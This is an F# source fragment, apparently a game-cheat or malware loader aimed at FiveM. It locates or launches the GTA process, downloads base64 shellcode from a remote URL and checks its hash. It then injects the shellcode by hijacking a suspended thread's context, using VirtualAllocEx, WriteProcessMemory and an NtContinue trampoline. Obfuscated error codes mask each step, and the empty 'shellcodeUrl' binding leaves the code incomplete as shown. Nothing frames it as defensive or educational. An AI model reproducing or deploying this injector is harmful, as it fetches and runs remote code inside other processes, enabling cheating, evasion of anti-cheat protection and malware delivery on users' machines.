let PROCESS_VM_OPERATION       = 0x0008u
let PROCESS_VM_READ            = 0x0010u
let PROCESS_VM_WRITE           = 0x0020u
let PROCESS_QUERY_INFORMATION  = 0x0400u
let PROCESS_QUERY_LIMITED_INFO = 0x1000u
let PROCESS_ACCESS =
    PROCESS_VM_OPERATION ||| PROCESS_VM_READ ||| PROCESS_VM_WRITE |||
    PROCESS_QUERY_INFORMATION ||| PROCESS_QUERY_LIMITED_INFO

let THREAD_SET_CONTEXT       = 0x0010u
let THREAD_GET_CONTEXT       = 0x0008u
let THREAD_SUSPEND_RESUME    = 0x0002u
let THREAD_QUERY_INFORMATION = 0x0040u
let THREAD_ACCESS =
    THREAD_SET_CONTEXT ||| THREAD_GET_CONTEXT |||
    THREAD_SUSPEND_RESUME ||| THREAD_QUERY_INFORMATION

let MEM_COMMIT        = 0x1000u
let MEM_RESERVE       = 0x2000u
let PAGE_READWRITE    = 0x04u
let PAGE_EXECUTE_READ = 0x20u

let CONTEXT_AMD64 = 0x00100000
let CONTEXT_FLAGS = CONTEXT_AMD64 ||| 0x1B
let CONTEXT_SIZE  = 0x4D0
let CTX_FLAGS_OFF = 0x30
let CTX_RSP       = 0x98
let CTX_RIP       = 0xF8

let shellcodeUrl =

let expectedSha256 = "ABDA8684E67AE9822C72B8E23193B5117065A944D45B2C7F760CCF15192A5256"

let fiveMFolder =
    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                 "AppData", "Local", "FiveM")

let fiveMExePath = Path.Combine(fiveMFolder, "FiveM.exe")

let runningGameProcesses () =
    try
        Process.GetProcesses()
        |> Array.filter (fun p ->
            try
                let n = p.ProcessName
                n.StartsWith("FiveM_b", StringComparison.OrdinalIgnoreCase) &&
                n.EndsWith("GTAProcess", StringComparison.OrdinalIgnoreCase)
            with _ -> false)
    with _ -> [||]

let sha256Hex (bytes: byte[]) =
    use sha = SHA256.Create()
    BitConverter.ToString(sha.ComputeHash(bytes)).Replace("-", "")

let stubPopOffset (data: byte[]) =
    5 + BitConverter.ToInt32(data, 1)

let stubRetOffset (data: byte[]) =
    stubPopOffset data + 22

let waitForGame () =
    try
        let mutable found : int option = None
        let mutable i = 0
        while found.IsNone && i < 120 do
            let ps = runningGameProcesses ()
            if ps.Length > 0 then
                found <- Some ps.[0].Id
            else
                Thread.Sleep 500
                i <- i + 1
        match found with
        | Some pid -> pid
        | None -> failwith "n27"
    with
    | Failure c when c.StartsWith "n" -> failwith c
    | _ -> failwith "n27"

let isElevated () =
    try
        use identity = WindowsIdentity.GetCurrent()
        WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator)
    with _ -> true

let startFiveM () =
    if isElevated () then
        let shellPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe")
        let arguments = "\"" + fiveMExePath + "\""
        let startInfo = ProcessStartInfo(shellPath, arguments)
        startInfo.WorkingDirectory <- fiveMFolder
        startInfo.UseShellExecute <- false
        startInfo.Verb <- ""
        Process.Start(startInfo) |> ignore
    else
        let startInfo = ProcessStartInfo(fiveMExePath)
        startInfo.WorkingDirectory <- fiveMFolder
        startInfo.UseShellExecute <- false
        startInfo.Verb <- ""
        Process.Start(startInfo) |> ignore

let findOrStartGamePid () =
    try
        let ps = runningGameProcesses ()
        if ps.Length > 0 then
            ps.[0].Id
        else
            if not (Directory.Exists fiveMFolder) then failwith "n25"
            if not (File.Exists fiveMExePath) then failwith "n26"
            let launchers =
                try Process.GetProcessesByName "FiveM"
                with _ -> [||]
            if launchers.Length = 0 then
                startFiveM ()
            waitForGame ()
    with
    | Failure c when c.StartsWith "n" -> failwith c
    | _ -> failwith "n27"

let loadShellcode () =
    try
        ServicePointManager.SecurityProtocol <- SecurityProtocolType.Tls12
        use client = new HttpClient()
        client.Timeout <- TimeSpan.FromSeconds(30.0)
        client.DefaultRequestHeaders.Add("User-Agent", "opencode-loader")
        client.DefaultRequestHeaders.Add("Accept", "application/vnd.github+json")
        use resp = client.GetAsync(shellcodeUrl, HttpCompletionOption.ResponseHeadersRead).GetAwaiter().GetResult()
        resp.EnsureSuccessStatusCode() |> ignore
        let body = resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()
        let matchContent = Regex.Match(body, "\"content\"\\s*:\\s*\"([^\"]+)\"")
        if not matchContent.Success then failwith "n1"
        let raw = matchContent.Groups.[1].Value
        let b64 =
            raw.Replace("\\n", "")
               .Replace("\\r", "")
               .Replace("\\t", "")
               .Replace("\\/", "/")
               .Replace(" ", "")
        let data = Convert.FromBase64String(b64)
        if sha256Hex data <> expectedSha256 then failwith "n2"
        if data.Length < 0x300 then failwith "n3"
        if data.[0] <> 0xE8uy then failwith "n4"
        let popOff = stubPopOffset data
        if popOff >= data.Length || data.[popOff] <> 0x59uy then failwith "n4"
        let retOff = stubRetOffset data
        if retOff + 1 > data.Length || data.[retOff] <> 0xC3uy then failwith "n5"
        data
    with
    | Failure c when c.StartsWith "n" -> failwith c
    | _ -> failwith "n1"

let injectShellcode (pid: int) (shellcode: byte[]) =
    try
        let proc = Process.GetProcessById pid
        let all = proc.Threads |> Seq.cast<ProcessThread> |> Seq.toList
        if all.IsEmpty then failwith "n6"
        let chosen =
            match all |> List.tryFind (fun t -> t.ThreadState = ThreadState.Wait) with
            | Some t -> t
            | None -> all.Head
        let tid = chosen.Id

        let hProc = OpenProcess(PROCESS_ACCESS, false, uint32 pid)
        if hProc = 0n then failwith "n7"

        let mutable hThread = 0n
        let mutable pContext = 0n
        let mutable remoteCode = 0n
        let mutable remoteCtx = 0n
        let mutable remoteTramp = 0n
        let mutable suspended = false

        try
            hThread <- OpenThread(THREAD_ACCESS, false, uint32 tid)
            if hThread = 0n then failwith "n8"

            if SuspendThread hThread = UInt32.MaxValue then failwith "n9"
            suspended <- true

            pContext <- Marshal.AllocHGlobal CONTEXT_SIZE
            let zeroes = Array.zeroCreate<byte> CONTEXT_SIZE
            Marshal.Copy(zeroes, 0, pContext, CONTEXT_SIZE)
            Marshal.WriteInt32(pContext, CTX_FLAGS_OFF, CONTEXT_FLAGS)

            if not (GetThreadContext(hThread, pContext)) then failwith "n10"

            let originalRsp = Marshal.ReadInt64(pContext, CTX_RSP)

            let hNtdll = GetModuleHandleW "ntdll.dll"
            if hNtdll = 0n then failwith "n11"
            let pNtContinue = GetProcAddress(hNtdll, "NtContinue")
            if pNtContinue = 0n then failwith "n12"

            let allocSize = (shellcode.Length + 0xFFF) &&& ~~~0xFFF
            remoteCode <- VirtualAllocEx(hProc, 0n, allocSize, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
            if remoteCode = 0n then failwith "n13"

            remoteCtx <- VirtualAllocEx(hProc, 0n, CONTEXT_SIZE, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
            if remoteCtx = 0n then failwith "n14"

            let trampSize = 0x40
            remoteTramp <- VirtualAllocEx(hProc, 0n, trampSize, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
            if remoteTramp = 0n then failwith "n15"

            let mutable written = 0n

            let ctxBytes = Array.zeroCreate<byte> CONTEXT_SIZE
            Marshal.Copy(pContext, ctxBytes, 0, CONTEXT_SIZE)
            if not (WriteProcessMemory(hProc, remoteCtx, ctxBytes, CONTEXT_SIZE, &written)) then failwith "n16"

            let stub = ResizeArray<byte>()
            let emit8 (v: byte) = stub.Add v
            let emit64 (v: int64) =
                for i in 0 .. 7 do
                    emit8 (byte ((v >>> (8 * i)) &&& 0xFFL))
            emit8 0x48uy; emit8 0xB9uy; emit64 (remoteCtx.ToInt64())
            emit8 0x48uy; emit8 0x31uy; emit8 0xD2uy
            emit8 0x48uy; emit8 0xB8uy; emit64 (pNtContinue.ToInt64())
            emit8 0xFFuy; emit8 0xD0uy
            emit8 0xCCuy
            let trampBytes = stub.ToArray()
            if not (WriteProcessMemory(hProc, remoteTramp, trampBytes, trampBytes.Length, &written)) then failwith "n17"

            let retOff = stubRetOffset shellcode
            if shellcode.[retOff] <> 0xC3uy then failwith "n18"

            if not (WriteProcessMemory(hProc, remoteCode, shellcode, shellcode.Length, &written)) then failwith "n19"

            let mutable oldProtect = 0u
            if not (VirtualProtectEx(hProc, remoteCode, allocSize, PAGE_EXECUTE_READ, &oldProtect)) then failwith "n20"

            oldProtect <- 0u
            if not (VirtualProtectEx(hProc, remoteTramp, trampSize, PAGE_EXECUTE_READ, &oldProtect)) then failwith "n21"

            let callRsp = originalRsp - 8L
            let frame = BitConverter.GetBytes (remoteTramp.ToInt64())
            if not (WriteProcessMemory(hProc, nativeint callRsp, frame, frame.Length, &written)) then failwith "n22"

            Marshal.WriteInt64(pContext, CTX_RIP, remoteCode.ToInt64())
            Marshal.WriteInt64(pContext, CTX_RSP, callRsp)

            if not (SetThreadContext(hThread, pContext)) then failwith "n23"

            let pVerify = Marshal.AllocHGlobal CONTEXT_SIZE
            try
                Marshal.Copy(zeroes, 0, pVerify, CONTEXT_SIZE)
                Marshal.WriteInt32(pVerify, CTX_FLAGS_OFF, CONTEXT_FLAGS)
                if not (GetThreadContext(hThread, pVerify)) then failwith "n24"
                if Marshal.ReadInt64(pVerify, CTX_RIP) <> remoteCode.ToInt64() then failwith "n24"
            finally
                Marshal.FreeHGlobal pVerify

            if ResumeThread hThread = UInt32.MaxValue then failwith "n28"
            suspended <- false

        finally
            if suspended && hThread <> 0n then ResumeThread hThread |> ignore
            if pContext <> 0n then Marshal.FreeHGlobal pContext
            if hThread <> 0n then CloseHandle hThread |> ignore
            if hProc <> 0n then CloseHandle hProc |> ignore
    with
    | Failure c when c.StartsWith "n" -> failwith c
    | _ -> failwith "n6"
